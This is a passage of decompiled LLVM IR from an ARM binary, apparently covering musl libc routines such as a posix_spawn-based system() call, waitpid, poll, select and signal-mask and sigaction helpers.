  %stack_var_-440 = alloca i32, align 4
  %stack_var_-724 = alloca i32, align 4
  %stack_var_-584 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %stack_var_-1060 = alloca i32, align 4
  %v3_e120 = load i32, i32* @r4, align 4
  %v6_e120 = load i32, i32* @r5, align 4
  %v9_e120 = load i32, i32* @r6, align 4
  %v12_e120 = load i32, i32* @r7, align 4
  %v15_e120 = load i32, i32* @lr, align 4
  %v2_e12c = ptrtoint i32* %stack_var_-444 to i32
  store i32 %v2_e12c, i32* @r4, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 0, i32* @r1, align 4
  store i32 140, i32* @r2, align 4
  store i32 %v2_e12c, i32* @r0, align 4
  %v0_e140 = call i32 @memset()
  store i32 %v0_e140, i32* @r0, align 4
  store i32 1, i32* @r5, align 4
  store i32 32512, i32* %stack_var_-32, align 4
  store i32 1, i32* %stack_var_-444, align 4
  %v1_e154 = call i32 @__pthread_testcancel(i32 %v0_e140)
  %v0_e158 = load i32, i32* @r7, align 4
  %v2_e158 = icmp eq i32 %v0_e158, 0
  br i1 %v2_e158, label %dec_label_pc_e2dc, label %dec_label_pc_e164

dec_label_pc_e164:                                ; preds = %entry
  store i32 %v2_e12c, i32* @r1, align 4
  %v2_e168 = ptrtoint i32* %stack_var_-584 to i32
  store i32 %v2_e168, i32* @r2, align 4
  %v3_e170 = call i32 @__sigaction(i32 2, i32 %v2_e12c, i32 %v2_e168)
  store i32 %v2_e12c, i32* @r1, align 4
  %v2_e178 = ptrtoint i32* %stack_var_-724 to i32
  store i32 %v2_e178, i32* @r2, align 4
  %v2_e17c = ptrtoint i32* %stack_var_-440 to i32
  store i32 %v2_e17c, i32* @r4, align 4
  %v3_e184 = call i32 @__sigaction(i32 3, i32 %v2_e12c, i32 %v2_e178)
  %v2_e188 = ptrtoint i32* %stack_var_-176 to i32
  store i32 %v2_e188, i32* @r6, align 4
  %v2_e194 = call i32 @sigaddset(i32 %v2_e17c, i32 17)
  %v2_e198 = ptrtoint i32* %stack_var_-304 to i32
  store i32 %v2_e198, i32* @r5, align 4
  store i32 %v2_e188, i32* @r2, align 4
  store i32 0, i32* @r0, align 4
  %v3_e1a8 = call i32 @sigprocmask(i32 0, i32 %v2_e17c, i32 %v2_e188)
  %v2_e1b0 = call i32 @sigemptyset(i32* nonnull %stack_var_-304)
  %v3_e1b4 = load i32, i32* %stack_var_-584, align 4
  %v7_e1b8 = icmp eq i32 %v3_e1b4, 1
  br i1 %v7_e1b8, label %.thread3, label %bb29

bb29:                                             ; preds = %dec_label_pc_e164
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_e164, %bb29
  %v1_e1c4 = xor i1 %v7_e1b8, true
  call void @__pseudo_cond_branch(i1 %v1_e1c4, i32 ptrtoint (i32* @global_var_e6f4.525 to i32))
  %v3_e1c8 = load i32, i32* %stack_var_-724, align 4
  %v7_e1cc = icmp eq i32 %v3_e1c8, 1
  br i1 %v7_e1cc, label %.thread4, label %bb30

bb30:                                             ; preds = %.thread3
  br label %.thread4

.thread4:                                         ; preds = %.thread3, %bb30
  store i32 57820, i32* @lr, align 4
  %v1_e1d8 = xor i1 %v7_e1cc, true
  call void @__pseudo_cond_branch(i1 %v1_e1d8, i32 ptrtoint (i32* @global_var_e6f4.525 to i32))
  %v2_e1e0 = ptrtoint i32* %stack_var_-1060 to i32
  store i32 %v2_e1e0, i32* @r4, align 4
  %v1_e1e8 = call i32 @posix_spawnattr_init(i32 %v2_e1e0)
  store i32 %v2_e188, i32* @r1, align 4
  %v2_e1f4 = call i32 @posix_spawnattr_setsigmask(i32 %v2_e1e0, i32 %v2_e188)
  store i32 %v2_e198, i32* @r1, align 4
  %v2_e200 = call i32 @posix_spawnattr_setsigdefault(i32 %v2_e1e0, i32 %v2_e198)
  %v3_e20c = call i32 @posix_spawnattr_setflags(i32* nonnull %stack_var_-1060, i32 12)
  store i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_19d4c.527, i32 0, i32 0), i8** %stack_var_-48, align 4
  %v2_e220 = load i32, i32* @global_var_23d34.409, align 4
  store i32 %v2_e220, i32* @r5, align 4
  store i32 0, i32* @lr, align 4
  %v2_e228 = ptrtoint i32* %stack_var_-32 to i32
  %v2_e23c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_e23c, i32* @r0, align 4
  %v2_e240 = ptrtoint i8** %stack_var_-48 to i32
  %v7_e254 = call i32 @posix_spawn(i32 %v2_e23c, i32 ptrtoint ([8 x i8]* @global_var_19d54.532 to i32), i32 0, i32 %v2_e1e0, i32 %v2_e240, i32 %v2_e220)
  store i32 %v7_e254, i32* @r5, align 4
  %v1_e260 = call i32 @posix_spawnattr_destroy(i32 %v2_e1e0)
  %v0_e264 = load i32, i32* @r5, align 4
  %v2_e264 = icmp eq i32 %v0_e264, 0
  br i1 %v2_e264, label %dec_label_pc_e26c, label %dec_label_pc_e298

dec_label_pc_e26c:                                ; preds = %.thread4
  store i32 %v2_e228, i32* @r4, align 4
  br label %dec_label_pc_e270

dec_label_pc_e270:                                ; preds = %dec_label_pc_e288, %dec_label_pc_e26c
  %v3_e278 = load i32, i32* %stack_var_-28, align 4
  %v3_e27c = call i32 @waitpid(i32 %v3_e278, i32 %v2_e228, i32 0)
  %v1_e280 = icmp slt i32 %v3_e27c, 0
  br i1 %v1_e280, label %dec_label_pc_e288, label %dec_label_pc_e298

dec_label_pc_e288:                                ; preds = %dec_label_pc_e270
  %v0_e288 = call i32 @__errno_location()
  %v1_e28c = inttoptr i32 %v0_e288 to i32*
  %v2_e28c = load i32, i32* %v1_e28c, align 4
  %v7_e290 = icmp eq i32 %v2_e28c, 4
  br i1 %v7_e290, label %dec_label_pc_e270, label %dec_label_pc_e298

dec_label_pc_e298:                                ; preds = %dec_label_pc_e270, %dec_label_pc_e288, %.thread4
  store i32 %v2_e168, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  %v3_e2a4 = call i32 @__sigaction(i32 2, i32 %v2_e168, i32 0)
  store i32 %v2_e178, i32* @r1, align 4
  store i32 0, i32* @r2, align 4
  %v3_e2b4 = call i32 @__sigaction(i32 3, i32 %v2_e178, i32 0)
  store i32 2, i32* @r0, align 4
  store i32 0, i32* @r2, align 4
  %v3_e2c4 = call i32 @sigprocmask(i32 2, i32 %v2_e188, i32 0)
  %v0_e2c8 = load i32, i32* @r5, align 4
  %v2_e2c8 = icmp eq i32 %v0_e2c8, 0
  br i1 %v2_e2c8, label %dec_label_pc_e2dc, label %dec_label_pc_e2d0

dec_label_pc_e2d0:                                ; preds = %dec_label_pc_e298
  %v0_e2d0 = call i32 @__errno_location()
  %v0_e2d4 = load i32, i32* @r5, align 4
  %v2_e2d4 = inttoptr i32 %v0_e2d0 to i32*
  store i32 %v0_e2d4, i32* %v2_e2d4, align 4
  br label %dec_label_pc_e2dc

dec_label_pc_e2dc:                                ; preds = %dec_label_pc_e2d0, %dec_label_pc_e298, %entry
  %storemerge.in = phi i32* [ @r5, %entry ], [ %stack_var_-32, %dec_label_pc_e298 ], [ %stack_var_-32, %dec_label_pc_e2d0 ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %v3_e120, i32* @r4, align 4
  store i32 %v6_e120, i32* @r5, align 4
  store i32 %v9_e120, i32* @r6, align 4
  store i32 %v12_e120, i32* @r7, align 4
  store i32 %v15_e120, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_e1e0, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v2_e198, { 1, 0, 2 }
  uselistorder i32 %v2_e188, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_e178, { 1, 0, 2, 3 }
  uselistorder i32 %v2_e168, { 1, 0, 2, 3 }
  uselistorder i32 %v2_e12c, { 0, 1, 3, 2, 4, 5 }
  uselistorder i32* %stack_var_-32, { 0, 1, 3, 2 }
  uselistorder i32* @global_var_23d34.409, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @sigprocmask, { 1, 0 }
  uselistorder i32 17, { 2, 0, 1, 4, 5, 3 }
  uselistorder i32 (i32, i32, i32)* @__sigaction, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e298, { 1, 0, 2 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
}

define i32 @waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r3, align 4
  store i32 %arg2, i32* @r2, align 4
  %v7_e328 = call i32 @__syscall_cp(i32 114, i32 %arg1, i32 %arg2, i32 %arg3, i32 0, i32 0, i32 0)
  store i32 %v7_e328, i32* @r0, align 4
  %v0_e32c = call i32 @__syscall_ret()
  ret i32 %v0_e32c

; uselistorder directives
  uselistorder i32 114, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @poll(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg3, i32* @r3, align 4
  store i32 %arg2, i32* @r2, align 4
  %v7_e368 = call i32 @__syscall_cp(i32 168, i32 %arg1, i32 %arg2, i32 %arg3, i32 0, i32 0, i32 0)
  store i32 %v7_e368, i32* @r0, align 4
  %v0_e36c = call i32 @__syscall_ret()
  ret i32 %v0_e36c

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
}

define i32 @select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %v0_e37c = load i32, i32* @lr, align 4
  store i32 %arg3, i32* @lr, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg3, i32* @r3, align 4
  %v7_e3ac = call i32 @__syscall_cp(i32 142, i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 0)
  store i32 %v7_e3ac, i32* @r0, align 4
  %v0_e3b0 = call i32 @__syscall_ret()
  store i32 %v0_e37c, i32* @lr, align 4
  ret i32 %v0_e3b0

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0, 2 }
}

define i32 @__syscall4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  store i32 %arg4, i32* @r2, align 4
  ret i32 %arg2
}

define i32 @__block_all_sigs(i32 %arg1) local_unnamed_addr {
entry:
  %v5_e404 = call i32 @__syscall4(i32 175, i32 0, i32 ptrtoint (i32* @global_var_19d64.534 to i32), i32 %arg1, i32 8)
  ret i32 %v5_e404
}

define i32 @__block_app_sigs(i32 %arg1) local_unnamed_addr {
entry:
  %v5_e438 = call i32 @__syscall4(i32 175, i32 0, i32 ptrtoint (i32* @global_var_19d5c.536 to i32), i32 %arg1, i32 8)
  ret i32 %v5_e438
}

define i32 @__restore_sigs(i32 %arg1) local_unnamed_addr {
entry:
  %v5_e46c = call i32 @__syscall4(i32 175, i32 2, i32 %arg1, i32 0, i32 8)
  ret i32 %v5_e46c
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_e488 = call i32 @__syscall_ret()
  ret i32 %v0_e488
}

define i32 @raise(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-144 = alloca i32, align 4
  %v3_e494 = load i32, i32* @r4, align 4
  %v2_e498 = ptrtoint i32* %stack_var_-144 to i32
  store i32 %arg1, i32* @r4, align 4
  %v1_e4a8 = call i32 @__block_app_sigs(i32 %v2_e498)
  store i32 %v1_e4a8, i32* @r0, align 4
  %v0_e4c0 = call i32 @__syscall_ret()
  %v1_e4cc = call i32 @__restore_sigs(i32 %v2_e498)
  store i32 %v3_e494, i32* @r4, align 4
  ret i32 %v0_e4c0
}

define i32 @___syscall4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_e4f0 = load i32, i32* @r3, align 4
  store i32 %v0_e4f0, i32* @r2, align 4
  ret i32 %arg2
}

define i32 @__get_handler_set(i32 %arg1) local_unnamed_addr {
entry:
  %v0_e514 = load i32, i32* @r0, align 4
  %v3_e514 = inttoptr i32 %v0_e514 to i16*
  %v4_e514 = call i32 @memcpy(i16* %v3_e514, i32 ptrtoint (i32* @global_var_23d14.538 to i32), i32 8)
  ret i32 %v4_e514
}

define i32 @__libc_sigaction() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_e528 = load i32, i32* @r4, align 4
  %v6_e528 = load i32, i32* @r5, align 4
  %v9_e528 = load i32, i32* @r6, align 4
  %v12_e528 = load i32, i32* @r7, align 4
  %v15_e528 = load i32, i32* @r8, align 4
  %v18_e528 = load i32, i32* @lr, align 4
  %v0_e52c = load i32, i32* @r0, align 4
  store i32 %v0_e52c, i32* @r8, align 4
  %v0_e538 = load i32, i32* @r1, align 4
  store i32 %v0_e538, i32* @r7, align 4
  %v0_e53c = load i32, i32* @r2, align 4
  store i32 %v0_e53c, i32* @r6, align 4
  %tmp = icmp ult i32 %v0_e52c, 65
  br i1 %tmp, label %dec_label_pc_e558, label %dec_label_pc_e544

dec_label_pc_e544:                                ; preds = %entry
  %v0_e544 = call i32 @__errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_e550 = inttoptr i32 %v0_e544 to i32*
  store i32 22, i32* %v2_e550, align 4
  %v0_e694.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e694

dec_label_pc_e558:                                ; preds = %entry
  %v2_e558 = icmp eq i32 %v0_e538, 0
  br i1 %v2_e558, label %bb, label %dec_label_pc_e564

bb:                                               ; preds = %dec_label_pc_e558
  store i32 0, i32* @r2, align 4
  br label %dec_label_pc_e634

dec_label_pc_e564:                                ; preds = %dec_label_pc_e558
  %v1_e564 = inttoptr i32 %v0_e538 to i32*
  %v2_e564 = load i32, i32* %v1_e564, align 4
  %v7_e568 = icmp eq i32 %v2_e564, 1
  store i1 %v7_e568, i1* @cpsr_z, align 1
  %tmp32 = or i32 %v2_e564, 1
  %tmp33 = icmp eq i32 %tmp32, 1
  br i1 %tmp33, label %dec_label_pc_e5f4, label %dec_label_pc_e570

dec_label_pc_e570:                                ; preds = %dec_label_pc_e564
  %v1_e570 = add i32 %v0_e52c, -1
  %v1_e574 = urem i32 %v1_e570, 32
  %v6_e57c = shl i32 1, %v1_e574
  store i32 %v6_e57c, i32* %r5.global-to-local, align 4
  %v3_e584 = udiv i32 %v1_e570, 32
  store i32 %v3_e584, i32* %r2.global-to-local, align 4
  %v4_e588 = mul nuw nsw i32 %v3_e584, 4
  %v5_e588 = add i32 %v4_e588, ptrtoint (i32* @global_var_23d14.538 to i32)
  store i32 %v5_e588, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e58c

dec_label_pc_e58c:                                ; preds = %dec_label_pc_e58c.dec_label_pc_e58c_crit_edge, %dec_label_pc_e570
  %v1_e594 = phi i32 [ %v1_e594.pre, %dec_label_pc_e58c.dec_label_pc_e58c_crit_edge ], [ %v6_e57c, %dec_label_pc_e570 ]
  %v0_e58c = phi i32 [ %v0_e58c.pre, %dec_label_pc_e58c.dec_label_pc_e58c_crit_edge ], [ %v5_e588, %dec_label_pc_e570 ]
  %v1_e58c = inttoptr i32 %v0_e58c to i32*
  %v2_e58c = load i32, i32* %v1_e58c, align 4
  store i32 %v0_e58c, i32* @r2, align 4
  %v2_e594 = or i32 %v2_e58c, %v1_e594
  %v3_e598 = call i32 @__a_cas(i32 %v2_e58c, i32 %v2_e594, i32 %v0_e58c)
  %v2_e59c = icmp eq i32 %v3_e598, 0
  store i1 %v2_e59c, i1* @cpsr_z, align 1
  br i1 %v2_e59c, label %dec_label_pc_e5a4, label %dec_label_pc_e58c.dec_label_pc_e58c_crit_edge

dec_label_pc_e58c.dec_label_pc_e58c_crit_edge:    ; preds = %dec_label_pc_e58c
  %v0_e58c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_e594.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_e58c

dec_label_pc_e5a4:                                ; preds = %dec_label_pc_e58c
  %v3_e5a8 = load i32, i32* @global_var_23e8c.541, align 4
  %v2_e5ac = icmp eq i32 %v3_e5a8, 0
  br i1 %v2_e5ac, label %dec_label_pc_e5b4, label %dec_label_pc_e5f4

dec_label_pc_e5b4:                                ; preds = %dec_label_pc_e5a4
  store i32 ptrtoint (i32* @global_var_23d10.543 to i32), i32* %r4.global-to-local, align 4
  %v2_e5b8 = load i32, i32* @global_var_23d10.543, align 4
  %v2_e5bc = icmp eq i32 %v2_e5b8, 0
  br i1 %v2_e5bc, label %dec_label_pc_e5c4, label %dec_label_pc_e5f4

dec_label_pc_e5c4:                                ; preds = %dec_label_pc_e5b4
  store i32 0, i32* @r3, align 4
  %v2_e5dc = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_e5dc, i32* @r2, align 4
  store i32 0, i32* %stack_var_-32, align 4
  %v2_e5e8 = call i32 @___syscall4(i32 175, i32 1)
  %v1_e5f0 = load i32, i32* %r4.global-to-local, align 4
  %v2_e5f0 = inttoptr i32 %v1_e5f0 to i32*
  store i32 1, i32* %v2_e5f0, align 4
  br label %dec_label_pc_e5f4

dec_label_pc_e5f4:                                ; preds = %dec_label_pc_e5b4, %dec_label_pc_e5a4, %dec_label_pc_e564, %dec_label_pc_e5c4
  %v0_e5f4 = load i32, i32* @r7, align 4
  %v1_e5f4 = add i32 %v0_e5f4, 132
  %v2_e5f4 = inttoptr i32 %v1_e5f4 to i32*
  %v3_e5f4 = load i32, i32* %v2_e5f4, align 4
  store i32 76564, i32* @r3, align 4
  store i32 76556, i32* @ip, align 4
  %v1_e600 = inttoptr i32 %v0_e5f4 to i32*
  %v2_e600 = load i32, i32* %v1_e600, align 4
  store i32 %v2_e600, i32* @r5, align 4
  %v1_e604 = and i32 %v3_e5f4, 4
  %v2_e604 = icmp eq i32 %v1_e604, 0
  %v2_e608 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_e608, i32* @r4, align 4
  br i1 %v2_e604, label %bb26, label %bb25

bb25:                                             ; preds = %dec_label_pc_e5f4
  store i32 76564, i32* @ip, align 4
  br label %bb26

bb26:                                             ; preds = %dec_label_pc_e5f4, %bb25
  %v1_e610 = or i32 %v3_e5f4, 67108864
  store i32 %v1_e610, i32* @lr, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  %v1_e618 = add i32 %v0_e5f4, 4
  store i32 %v2_e600, i32* %stack_var_-52, align 4
  %v3_e62c = bitcast i32* %stack_var_-40 to i16*
  %v4_e62c = call i32 @memcpy(i16* %v3_e62c, i32 %v1_e618, i32 8)
  store i32 %v2_e608, i32* @r2, align 4
  %v0_e634.pre = load i32, i32* @r6, align 4
  %v0_e640.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_e634

dec_label_pc_e634:                                ; preds = %bb, %bb26
  %v0_e640 = phi i32 [ %v0_e52c, %bb ], [ %v0_e640.pre, %bb26 ]
  %v1_e638 = phi i32 [ %v0_e53c, %bb ], [ %v0_e634.pre, %bb26 ]
  %v2_e634 = icmp eq i32 %v1_e638, 0
  %v3_e63c = ptrtoint i32* %stack_var_-72 to i32
  %storemerge = select i1 %v2_e634, i32 0, i32 %v3_e63c
  store i32 %storemerge, i32* @r3, align 4
  store i32 8, i32* @r5, align 4
  %v2_e650 = call i32 @___syscall4(i32 174, i32 %v0_e640)
  store i32 %v2_e650, i32* @r0, align 4
  %v0_e654 = call i32 @__syscall_ret()
  store i32 %v0_e654, i32* @r4, align 4
  %v2_e658 = icmp eq i32 %v0_e654, 0
  br i1 %v2_e658, label %dec_label_pc_e664, label %bb29

bb29:                                             ; preds = %dec_label_pc_e634
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e694

dec_label_pc_e664:                                ; preds = %dec_label_pc_e634
  %v0_e664 = load i32, i32* @r6, align 4
  %v2_e664 = icmp eq i32 %v0_e664, 0
  br i1 %v2_e664, label %bb30, label %dec_label_pc_e670

bb30:                                             ; preds = %dec_label_pc_e664
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e694

dec_label_pc_e670:                                ; preds = %dec_label_pc_e664
  %v3_e674 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_e674, i32* @r3, align 4
  %v1_e678 = add i32 %v0_e664, 4
  %v2_e67c = add i32 %v0_e664, 132
  %v3_e67c = inttoptr i32 %v2_e67c to i32*
  %v0_e680 = load i32, i32* @r3, align 4
  %v1_e680 = load i32, i32* @r6, align 4
  %v2_e680 = inttoptr i32 %v1_e680 to i32*
  store i32 %v0_e680, i32* %v2_e680, align 4
  %v0_e684 = load i32, i32* @r5, align 4
  store i32 %v0_e684, i32* %r2.global-to-local, align 4
  %v2_e688 = ptrtoint i32* %stack_var_-60 to i32
  %v3_e68c = inttoptr i32 %v1_e678 to i16*
  %v4_e68c = call i32 @memcpy(i16* %v3_e68c, i32 %v2_e688, i32 %v0_e684)
  %v0_e690 = load i32, i32* @r4, align 4
  store i32 %v0_e690, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e694

dec_label_pc_e694:                                ; preds = %bb30, %bb29, %dec_label_pc_e544, %dec_label_pc_e670
  %v0_e694 = phi i32 [ -1, %bb29 ], [ 0, %bb30 ], [ %v0_e694.pre, %dec_label_pc_e544 ], [ %v0_e690, %dec_label_pc_e670 ]
  store i32 %v3_e528, i32* @r4, align 4
  store i32 %v6_e528, i32* @r5, align 4
  store i32 %v9_e528, i32* @r6, align 4
  store i32 %v12_e528, i32* @r7, align 4
  store i32 %v15_e528, i32* @r8, align 4
  store i32 %v18_e528, i32* @lr, align 4
  ret i32 %v0_e694

; uselistorder directives
  uselistorder i32 %v0_e664, { 1, 0, 2 }
  uselistorder i32 %v2_e58c, { 1, 0 }
  uselistorder i32 %v0_e58c, { 2, 1, 0 }
  uselistorder i32 %v3_e584, { 1, 0 }
  uselistorder i32 %v0_e52c, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32)* @___syscall4, { 1, 0 }
  uselistorder label %dec_label_pc_e694, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_e634, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %dec_label_pc_e5f4, { 3, 0, 1, 2 }
}

define i32 @__sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_e6bc = add i32 %arg1, -32
  %tmp = icmp ult i32 %v1_e6bc, 3
  br i1 %tmp, label %dec_label_pc_e6d8, label %dec_label_pc_e6cc

dec_label_pc_e6cc:                                ; preds = %entry
  %v0_e6d4 = call i32 @__libc_sigaction()
  br label %dec_label_pc_e6d8

dec_label_pc_e6d8:                                ; preds = %entry, %dec_label_pc_e6cc
  %v0_e6d8 = call i32 @__errno_location()
  %v2_e6e0 = inttoptr i32 %v0_e6d8 to i32*
  store i32 22, i32* %v2_e6e0, align 4
  ret i32 -1

; uselistorder directives
  uselistorder label %dec_label_pc_e6d8, { 1, 0 }
}

define i32 @sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %v1_e6fc = add i32 %arg2, -1
  %tmp = icmp ugt i32 %v1_e6fc, 63
  br i1 %tmp, label %dec_label_pc_e71c, label %dec_label_pc_e710

dec_label_pc_e710:                                ; preds = %entry
  %v1_e710 = add i32 %arg2, -32
  %tmp4 = icmp ugt i32 %v1_e710, 2
  br i1 %tmp4, label %dec_label_pc_e730, label %dec_label_pc_e71c

dec_label_pc_e71c:                                ; preds = %dec_label_pc_e710, %entry
  %v0_e71c = call i32 @__errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_e728 = inttoptr i32 %v0_e71c to i32*
  store i32 22, i32* %v2_e728, align 4
  %v0_e74c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e74c

dec_label_pc_e730:                                ; preds = %dec_label_pc_e710
  %v3_e730 = udiv i32 %v1_e6fc, 32
  %v4_e734 = mul nuw nsw i32 %v3_e730, 4
  %v5_e734 = add i32 %v4_e734, %arg1
  %v6_e734 = inttoptr i32 %v5_e734 to i32*
  %v7_e734 = load i32, i32* %v6_e734, align 4
  %v1_e73c = urem i32 %v1_e6fc, 32
  %v7_e740 = shl i32 1, %v1_e73c
  %v8_e740 = or i32 %v7_e734, %v7_e740
  store i32 %v8_e740, i32* %v6_e734, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_e74c

dec_label_pc_e74c:                                ; preds = %dec_label_pc_e71c, %dec_label_pc_e730
  %v0_e74c = phi i32 [ %v0_e74c.pre, %dec_label_pc_e71c ], [ 0, %dec_label_pc_e730 ]
  ret i32 %v0_e74c

; uselistorder directives
  uselistorder i32 %v1_e6fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e74c, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_e764 = add i32 %tmp, 4
  %v3_e764 = inttoptr i32 %v2_e764 to i32*
  store i32 0, i32* %v3_e764, align 4
  %v1_e768 = load i32, i32* %r3.global-to-local, align 4
  %v2_e768 = inttoptr i32 %v1_e768 to i32*
  store i32 0, i32* %v2_e768, align 4
  ret i32 0
}

define i32 @sigprocmask(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_e770 = load i32, i32* @r4, align 4
  store i32 %v3_e770, i32* %stack_var_-8, align 4
  %v0_e774 = call i32 @pthread_sigmask()
  store i32 %v0_e774, i32* %r4.global-to-local, align 4
  %v2_e778 = icmp eq i32 %v0_e774, 0
  br i1 %v2_e778, label %dec_label_pc_e78c, label %dec_label_pc_e780

dec_label_pc_e780:                                ; preds = %entry
  %v0_e780 = call i32 @__errno_location()
  %v0_e784 = load i32, i32* %r4.global-to-local, align 4
  %v2_e784 = inttoptr i32 %v0_e780 to i32*
  store i32 %v0_e784, i32* %v2_e784, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_e78c

dec_label_pc_e78c:                                ; preds = %entry, %dec_label_pc_e780
  %v0_e78c = phi i32 [ 0, %entry ], [ -1, %dec_label_pc_e780 ]
  %v2_e790 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_e790, i32* %r4.global-to-local, align 4
  ret i32 %v0_e78c

; uselistorder directives
  uselistorder i32* %r4.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_e78c, { 1, 0 }
}

define i32 @__fclose_ca(i32 %arg1) local_unnamed_addr {
entry:
  %v1_e7a0 = add i32 %arg1, 12
  %v2_e7a0 = inttoptr i32 %v1_e7a0 to i32*
  %v3_e7a0 = load i32, i32* %v2_e7a0, align 4
  store i32 %v3_e7a0, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_e7a0)
  ret i32 %arg1
}

define i32 @__fopen_rb_ca(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_e7b8 = load i32, i32* @r4, align 4
  store i32 %v3_e7b8, i32* %stack_var_-24, align 4
  %v6_e7b8 = load i32, i32* @r5, align 4
  %v9_e7b8 = load i32, i32* @r6, align 4
  %v12_e7b8 = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %arg3, i32* %r8.global-to-local, align 4
  store i32 %tmp, i32* @r0, align 4
  store i32 144, i32* @r2, align 4
  store i32 0, i32* @r1, align 4
  store i32 %arg4, i32* @r6, align 4
  %v0_e7dc = call i32 @memset()
  %v0_e7e0 = load i32, i32* @r4, align 4
  store i32 %v0_e7e0, i32* @r0, align 4
  store i32 655360, i32* %r1.global-to-local, align 4
  %v0_e7ec = call i32 @__syscall_ret()
  %v1_e7f0 = icmp slt i32 %v0_e7ec, 0
  %v1_e7f4 = load i32, i32* @r5, align 4
  %v2_e7f4 = add i32 %v1_e7f4, 60
  %v3_e7f4 = inttoptr i32 %v2_e7f4 to i32*
  store i32 %v0_e7ec, i32* %v3_e7f4, align 4
  br i1 %v1_e7f0, label %.thread, label %dec_label_pc_e800

.thread:                                          ; preds = %entry
  br label %dec_label_pc_e848

dec_label_pc_e800:                                ; preds = %entry
  %v1_e814 = load i32, i32* @r5, align 4
  %v2_e814 = inttoptr i32 %v1_e814 to i32*
  store i32 9, i32* %v2_e814, align 4
  %v1_e81c = load i32, i32* @r5, align 4
  %v2_e81c = add i32 %v1_e81c, 32
  %v3_e81c = inttoptr i32 %v2_e81c to i32*
  store i32 ptrtoint (i32* @global_var_e890.547 to i32), i32* %v3_e81c, align 4
  %v1_e824 = load i32, i32* @r5, align 4
  %v2_e824 = add i32 %v1_e824, 40
  %v3_e824 = inttoptr i32 %v2_e824 to i32*
